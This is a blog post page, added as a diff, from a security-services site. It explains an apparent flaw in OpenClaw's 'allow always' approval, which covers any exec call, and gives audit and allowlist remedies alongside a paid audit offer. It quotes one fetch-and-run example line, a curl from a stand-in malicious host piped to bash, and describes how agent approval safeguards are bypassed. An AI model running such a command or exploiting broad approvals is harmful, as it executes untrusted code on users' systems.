@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Why "Allow Always" in OpenClaw Was a Terrible Idea (And What to Do Instead) — ClawReady</title>
+  <meta name="description" content="CVE-2026-29607: OpenClaw's 'allow always' approval binds to the wrapper command, not the inner command. Here's what that actually means for your security — and how to fix it.">
+  <meta property="og:title" content="Why 'Allow Always' in OpenClaw Was a Terrible Idea — And What to Do Instead">
+  <meta property="og:description" content="CVE-2026-29607 exposed a critical flaw: 'allow always' approvals bind to the wrapper, not the inner command. Most setups are affected. Here's the fix.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://clawreadynow.com/blog/openclaw-allow-always-risk">
+  <link rel="canonical" href="https://clawreadynow.com/blog/openclaw-allow-always-risk">
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-07JN7219ZL"></script>
+  <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-07JN7219ZL');</script>
+  <style>
+    :root{--bg:#0a0a0a;--surface:#141414;--border:#2a2a2a;--text:#e8e8e8;--muted:#888;--accent:#e74c3c;--accent-hover:#c0392b;--green:#27ae60;--yellow:#f39c12;--blue:#3498db}
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.7}
+    .container{max-width:780px;margin:0 auto;padding:0 24px}
+    nav{padding:20px 0;border-bottom:1px solid var(--border);margin-bottom:40px}
+    nav .nav-inner{max-width:780px;margin:0 auto;padding:0 24px;display:flex;justify-content:space-between;align-items:center}
+    nav a{color:var(--text);text-decoration:none}
+    nav .logo{font-weight:800;font-size:1.2rem}
+    nav .logo span{color:var(--accent)}
+    nav .nav-links a{color:var(--muted);margin-left:24px;font-size:.95rem;transition:color .2s}
+    nav .nav-links a:hover{color:var(--text)}
+    .article-header{padding:40px 0 30px;border-bottom:1px solid var(--border);margin-bottom:40px}
+    .article-header .tag{display:inline-block;background:rgba(231,76,60,.15);color:var(--accent);padding:4px 12px;border-radius:20px;font-size:.8rem;font-weight:600;margin-bottom:16px;text-transform:uppercase;letter-spacing:.05em}
+    .article-header h1{font-size:clamp(1.6rem,4vw,2.4rem);font-weight:800;letter-spacing:-.02em;margin-bottom:12px}
+    .article-header .subtitle{font-size:1.1rem;color:var(--muted);margin-bottom:16px}
+    .article-header .meta{font-size:.85rem;color:#555}
+    .article-body h2{font-size:1.5rem;font-weight:700;margin:40px 0 16px;padding-top:20px;border-top:1px solid var(--border);letter-spacing:-.01em}
+    .article-body h3{font-size:1.1rem;font-weight:600;margin:24px 0 10px;color:#fff}
+    .article-body p{margin-bottom:16px;color:var(--text)}
+    .article-body strong{color:#fff}
+    .article-body ul,.article-body ol{margin:0 0 16px 24px}
+    .article-body li{margin-bottom:8px}
+    .article-body code{background:var(--surface);border:1px solid var(--border);padding:2px 6px;border-radius:4px;font-size:.9rem;color:var(--accent)}
+    pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:20px;overflow-x:auto;margin:16px 0}
+    pre code{background:none;border:none;padding:0;font-size:.88rem;color:#ccc}
+    .callout{background:var(--surface);border-left:4px solid var(--accent);border-radius:0 8px 8px 0;padding:20px 24px;margin:28px 0}
+    .callout.green{border-left-color:var(--green)}
+    .callout.yellow{border-left-color:var(--yellow)}
+    .callout p{margin:0;font-size:.95rem}
+    .affected-box{background:rgba(231,76,60,.08);border:1px solid rgba(231,76,60,.3);border-radius:10px;padding:24px;margin:24px 0}
+    .affected-box h3{color:var(--accent);margin-bottom:12px;font-size:1rem}
+    .affected-box ul{margin:0 0 0 20px!important}
+    .affected-box li{font-size:.92rem;margin-bottom:6px}
+    .fix-steps{counter-reset:steps;list-style:none;margin:0 0 16px 0!important;display:flex;flex-direction:column;gap:12px}
+    .fix-steps li{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:18px 20px 18px 56px;position:relative;counter-increment:steps}
+    .fix-steps li::before{content:counter(steps);position:absolute;left:18px;top:18px;width:26px;height:26px;background:var(--accent);color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:.85rem}
+    .fix-steps li strong{display:block;margin-bottom:4px;color:#fff}
+    .fix-steps li span{color:var(--muted);font-size:.9rem}
+    .cta-box{background:linear-gradient(135deg,rgba(231,76,60,.15),rgba(231,76,60,.05));border:1px solid rgba(231,76,60,.3);border-radius:12px;padding:36px 40px;text-align:center;margin:48px 0 0}
+    .cta-box h2{font-size:1.5rem;font-weight:800;margin-bottom:10px}
+    .cta-box p{color:var(--muted);margin-bottom:24px}
+    .cta-btn{display:inline-block;background:var(--accent);color:#fff;font-weight:700;font-size:1rem;padding:14px 32px;border-radius:8px;text-decoration:none;transition:background .2s}
+    .cta-btn:hover{background:var(--accent-hover)}
+    footer{border-top:1px solid var(--border);padding:40px 0;margin-top:80px;text-align:center;color:var(--muted);font-size:.85rem}
+    footer a{color:var(--muted);text-decoration:none}
+  </style>
+</head>
+<body>
+<nav><div class="nav-inner"><a href="/" class="logo">Claw<span>Ready</span></a><div class="nav-links"><a href="/blog">Blog</a><a href="/#pricing">Pricing</a><a href="https://calendly.com/grofresh2018" target="_blank">Book a Call</a></div></div></nav>
+
+<div class="container">
+  <div class="article-header">
+    <div class="tag">🔴 Security</div>
+    <h1>Why "Allow Always" in OpenClaw Was a Terrible Idea — And What to Do Instead</h1>
+    <p class="subtitle">CVE-2026-29607 exposed a fundamental flaw in how OpenClaw's approval system works. If you ever clicked "allow always," your setup is almost certainly misconfigured in ways you didn't intend.</p>
+    <p class="meta">By ClawReady — April 5, 2026 · 7 min read</p>
+  </div>
+
+  <div class="article-body">
+
+    <p>Most people discover OpenClaw's approval prompts the hard way: you ask your agent to run a command, it asks for permission, you click <strong>"allow always"</strong> to make the nagging stop — and then you forget about it. That's exactly what the design encouraged. And it's exactly the problem.</p>
+
+    <p>CVE-2026-29607, disclosed last week, exposed the core flaw: <strong>"allow always" approvals bind to the wrapper command, not the inner command.</strong> In practice, this means approvals you granted for one thing silently authorized a much broader set of operations than you realized.</p>
+
+    <h2>What Actually Happens When You Click "Allow Always"</h2>
+
+    <p>Here's a concrete example. You approve <code>exec</code> with "allow always" because your agent needed to run a shell command. You think you've approved: <em>run this specific shell command.</em></p>
+
+    <p>What you actually approved: <em>any shell command, forever, with no further confirmation.</em></p>
+
+    <p>The approval binds to <code>exec</code> as the wrapper — not to the specific command string inside it. So <code>exec("ls -la")</code> and <code>exec("curl https://malicious.com | bash")</code> both fall under the same "allow always" grant.</p>
+
+    <div class="callout">
+      <p><strong>From the r/openclaw thread:</strong> "The approval system goes deeper than most people realize. CVE-2026-29607: the 'allow always' approval binds to the wrapper command, not the inner command. This means any exec call — regardless of what it runs — gets auto-approved once you've clicked allow always on any exec."</p>
+    </div>
+
+    <h2>Who This Affects</h2>
+
+    <div class="affected-box">
+      <h3>⚠️ Your setup is likely affected if you:</h3>
+      <ul>
+        <li>Ever clicked "allow always" on any approval prompt</li>
+        <li>Set up OpenClaw before v2026.3.28</li>
+        <li>Have entries in <code>~/.openclaw/exec-approvals.json</code> you didn't manually review</li>
+        <li>Used a setup guide that recommended "allow always" for convenience</li>
+        <li>Installed any skill that prompted for exec approval during setup</li>
+      </ul>
+    </div>
+
+    <p>The combination of CVE-2026-33579 (the privilege escalation from two weeks ago) and CVE-2026-29607 (this one) means that many installs from the past 3 months have both an exposed gateway <em>and</em> overly broad execution permissions. That's a meaningful attack surface.</p>
+
+    <h2>How to Check Your Current Approval State</h2>
+
+    <p>Run this to see what you've actually approved:</p>
+
+    <pre><code>cat ~/.openclaw/exec-approvals.json</code></pre>
+
+    <p>What you're looking for:</p>
+    <ul>
+      <li>Any entry with <code>"allow": "always"</code> — this is the problem pattern</li>
+      <li>Broad wrapper approvals like <code>exec</code>, <code>browser</code>, or <code>process</code> with always-allow</li>
+      <li>Entries you don't recognize or don't remember approving</li>
+    </ul>
+
+    <p>If the file doesn't exist, you're on a fresh install or post-patch v2026.4.1+ which defaults to blocking. That's the safe state.</p>
+
+    <h2>The Fix: Replace "Allow Always" With Allowlists</h2>
+
+    <p>The correct pattern is to approve specific command strings, not wrapper tools. Here's how to restructure your approvals:</p>
+
+    <h3>Step 1 — Audit and wipe the bad approvals</h3>
+
+    <pre><code># Back up first
+cp ~/.openclaw/exec-approvals.json ~/.openclaw/exec-approvals.json.bak
+
+# Reset to empty (forces re-approval on next use)
+echo '{}' > ~/.openclaw/exec-approvals.json</code></pre>
+
+    <h3>Step 2 — Use "allow once" going forward</h3>
+
+    <p>When OpenClaw asks for approval, use <strong>"allow once"</strong> as your default. Only escalate to a persistent allowlist entry for commands you run constantly and fully understand.</p>
+
+    <h3>Step 3 — Build a proper allowlist in openclaw.json</h3>
+
+    <p>Instead of "allow always" in the approval dialog, configure a scoped allowlist in your config. This explicitly defines what can run without prompting:</p>
+
+    <pre><code>{
+  "exec": {
+    "allowlist": [
+      "git status",
+      "git add -A",
+      "git commit",
+      "git push origin main",
+      "npm run build",
+      "ls",
+      "cat"
+    ],
+    "defaultPolicy": "ask"
+  }
+}</code></pre>
+
+    <p>This gives you convenience for your actual recurring commands without blanket approval for anything <code>exec</code> can reach.</p>
+
+    <h3>Step 4 — Set defaultPolicy to "ask" or "deny"</h3>
+
+    <p>Make sure your config doesn't have <code>"defaultPolicy": "allow"</code> anywhere. The safe default is <code>"ask"</code> — prompts you for anything not on the allowlist. <code>"deny"</code> is appropriate for production setups where you want maximum control.</p>
+
+    <div class="callout yellow">
+      <p><strong>If you're on v2026.4.1+</strong>, the new <code>exec-approvals.json</code> architecture partially addresses this — but only for new approvals. Existing "allow always" entries from before the update are still in effect until you clear them manually.</p>
+    </div>
+
+    <h2>The Broader Lesson</h2>
+
+    <p>OpenClaw's approval system was designed with good intentions — give users visibility and control over what their agent does. The problem was UX: approval prompts are annoying, "allow always" made them stop, and the underlying binding semantics were never explained clearly.</p>
+
+    <p>The result is that most users who've been running OpenClaw for more than a month have accumulated a set of "allow always" entries they don't fully understand, covering broader permissions than they intended.</p>
+
+    <p>This isn't a criticism of OpenClaw — it's a rapidly evolving platform and security models take time to mature. But it does mean that installs from 3–6 months ago need an active audit, not just a version update.</p>
+
+    <h2>What a Security Audit Covers</h2>
+
+    <p>When ClawReady audits an existing setup, approval configuration is one of the first things we check:</p>
+
+    <ul>
+      <li>Review all existing exec-approvals.json entries</li>
+      <li>Clear overly broad "allow always" approvals</li>
+      <li>Build a scoped allowlist matched to your actual workflow</li>
+      <li>Set defaultPolicy correctly for your risk tolerance</li>
+      <li>Verify no other CVE-29607 or CVE-33579 exposure remains</li>
+      <li>Document the approval model so you understand what's running and why</li>
+    </ul>
+
+    <div class="callout green">
+      <p>Our <strong>$49 security audit</strong> covers this and the full 32-point checklist. If you've been running OpenClaw for more than a month without reviewing your approval config, it's worth doing. <a href="https://calendly.com/grofresh2018" target="_blank" style="color:var(--green)">Book a call →</a></p>
+    </div>
+
+  </div>
+
+  <div class="cta-box">
+    <h2>Not Sure What You've Approved?</h2>
+    <p>We'll audit your approval config, clean up overly broad grants, and leave you with a properly scoped allowlist. $49 flat.</p>
+    <a href="https://calendly.com/grofresh2018" target="_blank" class="cta-btn">Book a Security Audit →</a>
+  </div>
+</div>
+
+<footer><p>© 2026 ClawReady · <a href="/">Home</a> · <a href="/blog">Blog</a> · <a href="mailto:growfresh2018@gmail.com">Contact</a></p></footer>
+</body>
+</html>
